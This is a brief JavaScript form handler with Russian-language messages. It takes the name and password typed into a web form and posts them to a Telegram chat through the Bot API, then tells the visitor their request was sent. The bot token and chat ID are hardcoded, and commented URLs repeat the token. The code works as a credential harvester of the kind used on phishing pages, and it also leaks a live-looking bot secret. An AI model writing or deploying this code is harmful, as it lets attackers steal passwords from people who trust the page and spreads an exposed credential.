
const TOKEN = "6106823311:AAEEPwJMqcDGXBZGBr0BuXCBqLZMQx_WqNg";
const CHAT_ID = "-694171854";
const URI_IP = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
const success = document.getElementById('success')


document.getElementById('tg').addEventListener('submit',function (e) {
    e.preventDefault();

    let message = `<b>Заявка с сайта!</b>`;
    message += `<b>Отправитель: </b>
       ${ this.name.value}\n`;
    message += `<b>Пароль: </b>
      ${ this.password.value}`;

    axios.post(URI_IP, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
        .then(() =>{
            this.name.value = '';
            this.password.value = '';
            success.innerHTML = 'Сообщение отправлено';
            success.style.display = 'block';
        })
        .catch((err) =>{
            console.warn(err)
        })
        .finally(() =>{
            alert("Ваш запрос успешно отправлено")
        })

})


//
// // https://api.telegram.org/bot6106823311:AAEEPwJMqcDGXBZGBr0BuXCBqLZMQx_WqNg/getUpdates
//
// // https://api.telegram.org/bot6106823311:AAEEPwJMqcDGXBZGBr0BuXCBqLZMQx_WqNg/sendMessage?chat_id=-694171854&text=welcome_to_my_group
//
//
